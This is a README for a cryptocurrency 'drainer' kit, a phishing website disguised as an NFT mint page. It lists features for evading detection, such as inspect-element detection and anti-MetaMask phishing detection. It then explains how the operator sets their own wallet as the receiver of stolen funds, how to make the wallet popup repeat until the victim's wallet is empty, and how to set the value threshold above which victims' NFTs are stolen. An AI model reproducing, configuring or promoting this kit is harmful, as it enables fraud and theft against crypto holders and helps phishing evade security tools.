# seaport-drainer
## 💡 Features
 - Inspect Element Detection
 - Custom Design.
 - Cool design
 - Instant transactions
 - No contract required
 - Anti Metamask Phishing Detection;
## 👻 Guide:
In order to use this website, you need to edit the settings.js file. On line 1: const receiveAddress = "YOUR WALLET"; replace YOUR WALLET with your ETH wallet address.

In the settings.js files, lines after "const collectionInfo" will change the text shown on the page and the images. Images are located in the assets folder, you can change them there.

In the settings.js files, lines after "const mintInfo" will change the minting price, the maximum supply, the minimum to be minted if the person doesn't have any NFTs, the maximum to be minted... Line "askMintLoop: true," = metamask popup will open again and again until the wallet is empty.

## 👻 Important :
Lines after "const drainNftsInfo" will be used for the NFT drainer. Edit lines : nftReceiveAddress: "YOUR WALLET", replace YOUR WALLET with your ETH wallet address. Line "minValue: 0.2," is the minimum value of a NFT before it gets stolen. Exemple : If you change this value to 1, the script will only steal NFTs that have a value higher to 1.

